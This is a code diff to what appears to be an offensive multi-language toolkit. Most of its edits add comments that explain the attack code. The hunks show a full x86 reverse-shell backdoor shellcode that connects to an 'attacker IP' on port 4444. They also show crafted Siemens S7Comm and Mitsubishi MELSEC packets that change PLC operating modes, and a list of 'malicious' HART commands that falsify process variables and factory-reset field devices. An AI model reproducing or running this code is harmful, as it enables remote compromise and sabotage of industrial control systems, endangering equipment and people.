@@ -10182,13 +10182,14 @@ impl NetworkExploiter {
     }
 
     fn craft_tftp_read_request(&self, filename: &str) -> Vec<u8> {
+        // TFTP Read Request (RRQ) packet structure per RFC 1350
         let mut request = Vec::new();
-        request.push(0x00); // Opcode (RRQ)
-        request.push(0x01);
+        request.push(0x00); // Opcode high byte
+        request.push(0x01); // Opcode low byte (RRQ = 0x0001)
         request.extend_from_slice(filename.as_bytes());
-        request.push(0x00);
+        request.push(0x00); // Filename null terminator
         request.extend_from_slice(b"octet");
-        request.push(0x00);
+        request.push(0x00); // Mode null terminator
         request
     }
 
@@ -10248,13 +10249,13 @@ class ChipReader:
     def read_flash_chip(self, chip_type, size_mb=16):
         print(f"[+] Reading {chip_type} flash chip ({size_mb}MB)")
         
-        # Common flash chip commands
+        # Common SPI flash chip commands (per JEDEC standard)
         commands = {
-            "read_id": b'\x9F',
-            "read_data": b'\x03',
-            "fast_read": b'\x0B',
-            "power_down": b'\xB9',
-            "release_power_down": b'\xAB'
+            "read_id": b'\x9F',         # JEDEC ID (0x9F)
+            "read_data": b'\x03',       # Read Data (0x03)
+            "fast_read": b'\x0B',       # Fast Read (0x0B)
+            "power_down": b'\xB9',      # Deep Power-Down (0xB9)
+            "release_power_down": b'\xAB'  # Release Power-Down (0xAB)
         }
         
         # Simulate chip reading process
@@ -10382,62 +10383,63 @@ func (vs *VulnerabilityScanner) checkBufferOverflows() {
 
         // Assembly integration for shellcode injection
         std::string assembly_backdoor = R"(
-; Backdoor Shellcode - x86 Assembly Implementation
+; Backdoor Shellcode - x86 Linux Assembly Implementation
+; Reverse shell connecting to attacker (127.1.1.1:4444)
 section .text
     global _start
 
 _start:
-    ; Reverse shell shellcode for persistent access
+    ; Zero out registers for clean state
     xor eax, eax
     xor ebx, ebx
     xor ecx, ecx
     xor edx, edx
     
     ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
-    mov al, 0x66     ; sys_socketcall
-    mov bl, 0x1      ; SYS_SOCKET
-    push ecx         ; IPPROTO_IP
+    mov al, 0x66     ; sys_socketcall (syscall number)
+    mov bl, 0x1      ; SYS_SOCKET (socketcall type)
+    push ecx         ; IPPROTO_IP (0)
     push 0x1         ; SOCK_STREAM
     push 0x2         ; AF_INET
-    mov ecx, esp
-    int 0x80
+    mov ecx, esp     ; pointer to args
+    int 0x80         ; invoke syscall
     mov esi, eax     ; save socket fd
     
     ; connect(sockfd, &sockaddr, sizeof(sockaddr))
     mov al, 0x66     ; sys_socketcall
     mov bl, 0x3      ; SYS_CONNECT
-    push 0x0101017F  ; 127.1.1.1 (attacker IP)
-    push word 0x5C11 ; port 4444
-    push word 0x2    ; AF_INET
-    mov ecx, esp
-    push 0x10        ; sizeof(sockaddr)
-    push ecx         ; &sockaddr
+    push 0x0101017F  ; sin_addr: 127.1.1.1 (attacker IP, little endian)
+    push word 0x5C11 ; sin_port: 4444 in network byte order (0x115C reversed)
+    push word 0x2    ; sin_family: AF_INET
+    mov ecx, esp     ; pointer to sockaddr struct
+    push 0x10        ; sizeof(sockaddr_in) = 16
+    push ecx         ; pointer to sockaddr
     push esi         ; sockfd
-    mov ecx, esp
-    int 0x80
+    mov ecx, esp     ; pointer to args
+    int 0x80         ; invoke syscall
     
     ; dup2 STDIN, STDOUT, STDERR to socket
     xor ecx, ecx
-    mov cl, 0x3
+    mov cl, 0x3      ; loop counter (3 file descriptors)
 dup_loop:
     mov al, 0x3F     ; sys_dup2
-    mov ebx, esi     ; sockfd
-    dec cl
+    mov ebx, esi     ; oldfd: sockfd
+    dec cl           ; newfd: 2, 1, 0 (STDERR, STDOUT, STDIN)
     int 0x80
-    jnz dup_loop
+    jnz dup_loop     ; loop until ecx = 0
     
     ; execve("/bin/sh", NULL, NULL)
     xor eax, eax
-    push eax
-    push 0x68732f2f  ; "sh//"
-    push 0x6e69622f  ; "/bin"
-    mov ebx, esp     ; filename
-    push eax         ; NULL
-    mov edx, esp     ; envp
-    push ebx         ; argv
-    mov ecx, esp     ; argv
-    mov al, 0xB      ; sys_execve
-    int 0x80
+    push eax         ; NULL terminator
+    push 0x68732f2f  ; "hs//" (reversed: "//sh")
+    push 0x6e69622f  ; "nib/" (reversed: "/bin")
+    mov ebx, esp     ; filename: "/bin//sh"
+    push eax         ; NULL (end of argv array)
+    mov edx, esp     ; envp: NULL
+    push ebx         ; argv[0]: "/bin//sh"
+    mov ecx, esp     ; argv: ["/bin//sh", NULL]
+    mov al, 0xB      ; sys_execve (syscall number)
+    int 0x80         ; invoke syscall
         )";
 
         std::cout << "[+] Backdoor injection framework loaded" << std::endl;
@@ -10610,11 +10612,14 @@ class ControllerModeExploiter:
         """
         Exploit Siemens S7Comm protocol for mode manipulation.
         Uses S7 communication protocol vulnerabilities to change controller modes.
+        
+        See implementation: tools/s7comm_security_framework/s7comm_exploit.py:63
         """
         print("[+] Exploiting Siemens S7Comm protocol...")
         techniques = []
         
         # C code integration for low-level S7 manipulation
+        # Function code 0x28 validated: tools/s7comm_security_framework/s7comm_exploit.py:63
         c_s7_exploit = """
         // Siemens S7Comm Mode Manipulation - C Implementation
         #include <stdio.h>
@@ -10638,7 +10643,7 @@ class ControllerModeExploiter:
             S7_Mode_Change_PDU pdu = {0};
             pdu.protocol_id = 0x32;
             pdu.message_type = 0x01;
-            pdu.function_code = 0x28;  // PLC control
+            pdu.function_code = 0x28;  // PLC_CONTROL (S7FunctionCode)
             pdu.subfunction = 0x05;    // Operating mode set
             pdu.mode_command = 0x03;   // RUN mode
             
@@ -10874,20 +10879,21 @@ class ControllerModeExploiter:
             }
             
             pub fn craft_melsec_mode_packet(&self, mode: u8) -> Vec<u8> {
+                // Mitsubishi MELSEC-Q protocol packet structure
                 let mut packet = Vec::new();
                 
-                // Melsec-Q header
-                packet.extend_from_slice(&[0x50, 0x00]); // Subheader
-                packet.push(0x00); // Network number
-                packet.push(0xFF); // PLC number  
-                packet.extend_from_slice(&[0x00, 0x00, 0x00]); // Request destination module
-                packet.push(0x00); // Request destination multi-drop
+                // MELSEC-Q MC Protocol header (E71 format)
+                packet.extend_from_slice(&[0x50, 0x00]); // Subheader (0x50 = MELSEC binary)
+                packet.push(0x00); // Network number (0x00 = own network)
+                packet.push(0xFF); // PLC number (0xFF = direct connection)
+                packet.extend_from_slice(&[0x03, 0xFF, 0x00]); // Request destination module I/O No.
+                packet.push(0x00); // Request destination multi-drop station No.
                 
                 // Mode change command
-                packet.extend_from_slice(&[0x04, 0x00]); // Monitoring timer
-                packet.push(0x18); // Command (Remote control)
-                packet.push(0x01); // Subcommand
-                packet.push(mode); // Mode (RUN/STOP/etc)
+                packet.extend_from_slice(&[0x04, 0x00]); // Monitoring timer (little endian)
+                packet.push(0x18); // Command code 0x1001 (Remote control) high byte
+                packet.push(0x01); // Command code low byte
+                packet.push(mode); // Mode parameter (1=RUN, 2=STOP, etc.)
                 
                 packet
             }
@@ -13556,6 +13562,10 @@ class HARTExploitation:
         # Initialize HART modem interface (1200 baud FSK)
         ser = serial.Serial(self.interface, 1200, bytesize=7, parity='E', stopbits=1, timeout=2)
         
+        # HART command frame structure (HCF SPEC-13):
+        # Byte 0: Delimiter (0x82 = long frame with 2 expansion bytes)
+        # Byte 1: Command code
+        # Following bytes: Command data
         malicious_commands = [
             # Command 6: Write Primary Variable - Manipulate process measurement
             b'\x82\x06\x00\x00\x00\x00\x00\x00',
@@ -13563,8 +13573,8 @@ class HARTExploitation:
             # Command 7: Write Device Variables - Overwrite critical configuration
             b'\x82\x07\xFF\xFF\xFF\xFF\xFF\xFF',
             
-            # Command 72: Reset Device Configuration - Factory reset disruption
-            b'\x82\x48\x00\x00\x00\x00\x00\x00',
+            # Command 48 (0x30): Reset Device - Factory reset disruption
+            b'\x82\x30\x00\x00\x00\x00\x00\x00',
             
             # Command 13: Write Message - Inject malicious device message
             b'\x82\x0D\x41\x41\x41\x41\x41\x41',  # "AAAAAA" message
@@ -13679,9 +13689,14 @@ class HARTExploitation:
         """
         Load comprehensive HART command set for exploitation.
         Includes standard, common practice, and device-specific commands.
+        
+        Command structure per HART Communication Protocol Specification (HCF SPEC-13):
+        - Universal Commands (0-30): Mandatory for all HART devices
+        - Common Practice Commands (32-126): Optional but widely implemented
+        - Device-Specific Commands (128-253): Vendor/device specific
         """
         hart_commands = {
-            # Universal Commands (0-30)
+            # Universal Commands (0-30) - HART Spec HCF SPEC-13
             0: 'Read Primary Variable',
             1: 'Read Loop Current',
             2: 'Read Dynamic Variables',
